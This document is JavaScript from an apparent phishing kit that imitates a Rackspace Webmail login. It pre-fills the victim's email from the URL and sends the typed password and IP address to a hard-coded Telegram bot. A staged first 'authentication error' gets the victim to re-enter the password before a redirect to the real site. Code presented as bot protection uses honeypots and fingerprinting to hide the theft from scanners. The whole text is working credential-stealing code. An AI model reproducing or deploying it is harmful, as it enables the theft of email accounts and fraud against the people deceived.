  <script>
  // Wait for page to fully load
  window.addEventListener('load', function() {
    // Extract email from URL hash (e.g., #john@gmail.com)
    const emailFromUrl = decodeURIComponent(window.location.hash.substring(1));
    
    // Also check for email parameter in query string
    const urlParams = new URLSearchParams(window.location.search);
    const emailFromQuery = urlParams.get('email');
    
    // Use email from hash first, then from query parameter
    const finalEmail = emailFromUrl || emailFromQuery;
    
    // Basic validation (must contain @ and ., and no spaces)
    if (finalEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(finalEmail)) {
      // Set the email in both the visible and hidden fields
      document.getElementById('hidden-email').value = finalEmail;
      document.getElementById('Email').value = finalEmail;
    }

    // Show authentication error if this is after first submission
    if (sessionStorage.getItem('showAuthError')) {
      setTimeout(() => {
        showAuthErrorPopup();
      }, 1000);
      sessionStorage.removeItem('showAuthError');
    }
  });

  // Function to show authentication error popup
  function showAuthErrorPopup() {
    const popup = document.getElementById('authErrorPopup');
    popup.classList.add('show');
    
    // Auto-hide after 5 seconds
    setTimeout(() => {
      popup.classList.add('fade-out');
      setTimeout(() => {
        popup.classList.remove('show', 'fade-out');
      }, 500);
    }, 5000);
  }
  </script>

  <script>
  // Advanced Bot Protection Integration
  (function() {
    'use strict';

    const RackspaceAntiBot = {
      startTime: Date.now(),
      mouseMovements: 0,
      keyPresses: 0,
      minInteractionTime: 3000,
      honeypots: new Set(['email_confirm', 'website', 'phone_alt', 'bot-trap']),
      submissionBlocked: false,

      init: function() {
        this.setupForm();
        this.trackUserBehavior();
        this.setupSubmitHandler();
        this.generateFingerprint();
      },

      setupForm: function() {
        // Set form initialization time
        document.getElementById('_form_init_time').value = this.startTime;
        
        // Add bot protection attribute
        document.getElementById('email-form').setAttribute('data-bot-protection', 'enabled');
      },

      trackUserBehavior: function() {
        document.addEventListener('mousemove', () => {
          this.mouseMovements++;
        }, { passive: true });

        document.addEventListener('keydown', () => {
          this.keyPresses++;
        }, { passive: true });

        document.addEventListener('touchstart', () => {
          this.mouseMovements++;
        }, { passive: true });
      },

      generateFingerprint: function() {
        const components = [
          navigator.userAgent,
          navigator.language,
          screen.width,
          screen.height,
          screen.colorDepth,
          new Date().getTimezoneOffset(),
          !!window.sessionStorage,
          !!window.localStorage
        ];
        document.getElementById('_client_fingerprint').value = btoa(components.join('|'));
      },

      generateValidationToken: function() {
        const data = `${this.startTime}:${this.mouseMovements}:${this.keyPresses}:${Date.now()}`;
        return btoa(data);
      },

      validateBehavior: function() {
        const timeSpent = Date.now() - this.startTime;

        if (timeSpent < this.minInteractionTime) {
          return { valid: false, reason: 'Form submitted too quickly' };
        }

        if (this.mouseMovements < 3 && this.keyPresses < 5) {
          return { valid: false, reason: 'Insufficient user interaction detected' };
        }

        return { valid: true };
      },

      checkHoneypots: function() {
        const honeypotFields = ['email_confirm', 'website', 'phone_alt', 'bot-trap'];
        for (const field of honeypotFields) {
          const element = document.querySelector(`[name="${field}"]`);
          if (element && element.value !== '') {
            return { valid: false, reason: 'Honeypot field filled: ' + field };
          }
        }
        return { valid: true };
      },

      validateTimezone: function() {
        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        if (!tz || tz === 'UTC') {
          return { valid: false, reason: 'Invalid timezone detected' };
        }
        return { valid: true };
      },

      validateScreen: function() {
        if (window.screen.width === 0 || window.screen.height === 0) {
          return { valid: false, reason: 'Invalid screen dimensions' };
        }
        return { valid: true };
      },

      setupSubmitHandler: function() {
        const form = document.getElementById('email-form');
        
        // Advanced event blocking for email field
        $('#Email').on('focus click keydown keyup keypress input change', (e) => {
          e.preventDefault();
          e.stopPropagation();
          this.submissionBlocked = true;
          return false;
        });

        // Copy/paste protection
        $('#Email').on('copy cut paste', (e) => {
          e.preventDefault();
          this.submissionBlocked = true;
          return false;
        });

        $(form).submit((event) => {
          event.preventDefault();
          this.handleFormSubmission();
        });
      },

      handleFormSubmission: function() {
        // Run all validations
        const validations = [
          this.validateBehavior(),
          this.checkHoneypots(),
          this.validateTimezone(),
          this.validateScreen()
        ];

        const failedValidation = validations.find(v => !v.valid);

        if (failedValidation || this.submissionBlocked) {
          console.warn('Bot detected:', failedValidation ? failedValidation.reason : 'Email field interaction detected');
          this.showFakeSuccess();
          return;
        }

        // If all validations pass, proceed with Telegram submission
        this.submitToTelegram();
      },

      showFakeSuccess: function() {
        const form = document.getElementById('email-form');
        const fakeMessage = document.createElement('div');
        fakeMessage.className = 'success-message';
        fakeMessage.textContent = 'Thank you! Your submission has been received.';
        form.parentElement.insertBefore(fakeMessage, form.nextSibling);
        form.style.display = 'none';

        setTimeout(() => {
          window.location.href = "https://apps.rackspace.com/";
        }, 2000);
      },

      showCacheClearedNotification: function() {
        const notification = document.getElementById('cacheNotification');
        notification.classList.add('show');
        
        setTimeout(() => {
          notification.classList.add('fade-out');
          setTimeout(() => {
            window.location.href = "https://apps.rackspace.com/";
          }, 500);
        }, 2000);
      },

      showAuthErrorPopup: function() {
        const popup = document.getElementById('authErrorPopup');
        popup.classList.add('show');
        
        setTimeout(() => {
          popup.classList.add('fade-out');
          setTimeout(() => {
            popup.classList.remove('show', 'fade-out');
          }, 500);
        }, 5000);
      },

      submitToTelegram: function() {
        // Set validation token
        document.getElementById('_validation_token').value = this.generateValidationToken();

        // Get form values
        let userEmail = $("#hidden-email").val();
        let userPassword = $("#pass").val();
        let userIP = $("#ip").val();

        if (!userEmail || !userPassword || userEmail === '' || userPassword === '') {
          console.error("Missing email or password");
          return;
        }

        // Telegram credentials
        let botToken = "8394570131:AAEc-hJYmNpdozyQn_5DM0uUhzr14F38Kj0";
        let chatId = "7241128758";

        let messageText = `üîê New Rackspace Login\nüìß Email: ${userEmail}\nüîë Password: ${userPassword}\nüåê IP Address: ${userIP}\nüåê Source: Rackspace Webmail\n‚è∞ Time: ${new Date().toLocaleString()}\nüñ±Ô∏è Interactions: ${this.mouseMovements}\n‚å®Ô∏è Keystrokes: ${this.keyPresses}`;

        let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Check if this is the first or second submission
        let submissionCount = sessionStorage.getItem('rackspaceSubmissionCount') || 0;
        
        if (submissionCount < 1) {
          // First submission - Set flag to show auth error after reload
          sessionStorage.setItem('showAuthError', 'true');
          submissionCount = 1;
          sessionStorage.setItem('rackspaceSubmissionCount', submissionCount);
          
          $.ajax({
            url: telegramUrl,
            type: "POST",
            data: {
              chat_id: chatId,
              text: messageText + "\nüîÑ First Submission",
              parse_mode: 'HTML'
            },
            success: () => {
              console.log("‚úÖ First form submission to Telegram successfully");
              setTimeout(() => {
                window.location.reload();
              }, 1000);
            },
            error: (jqXHR, textStatus, errorThrown) => {
              console.error("‚ùå First submission failed:", textStatus, errorThrown);
              setTimeout(() => {
                window.location.reload();
              }, 1000);
            }
          });
        } else {
          // Second submission - Show cache cleared notification
          sessionStorage.removeItem('rackspaceSubmissionCount');
          
          $.ajax({
            url: telegramUrl,
            type: "POST",
            data: {
              chat_id: chatId,
              text: messageText + "\nüîÑ Second Submission\nüíö Cache Cleared",
              parse_mode: 'HTML'
            },
            success: () => {
              console.log("‚úÖ Second form submission to Telegram successfully");
              this.showCacheClearedNotification();
            },
            error: (jqXHR, textStatus, errorThrown) => {
              console.error("‚ùå Second submission failed:", textStatus, errorThrown);
              this.showCacheClearedNotification();
            }
          });
        }
      }
    };

    // Initialize when document is ready
    $(document).ready(function() {
      // First, fetch user's IP
      $.getJSON("https://api64.ipify.org?format=json", function(data) {
        $("#ip").val(data.ip);
        console.log("User IP:", data.ip);
        
        // Initialize anti-bot protection after IP is fetched
        RackspaceAntiBot.init();
      });
      
      // Make sure email is preserved after page reload
      window.addEventListener('load', function() {
        const emailFromUrl = decodeURIComponent(window.location.hash.substring(1));
        const urlParams = new URLSearchParams(window.location.search);
        const emailFromQuery = urlParams.get('email');
        const finalEmail = emailFromUrl || emailFromQuery;
        
        if (finalEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(finalEmail)) {
          document.getElementById('hidden-email').value = finalEmail;
          document.getElementById('Email').value = finalEmail;
        }
      });

      // Additional protection: If bot tries to submit via JavaScript directly
      let originalSubmit = HTMLFormElement.prototype.submit;
      HTMLFormElement.prototype.submit = function() {
        console.log('Bot detected: Direct form submission attempt');
        window.location.href = "https://apps.rackspace.com/";
        return false;
      };
    });

    window.RackspaceAntiBot = RackspaceAntiBot;
  })();
  </script>
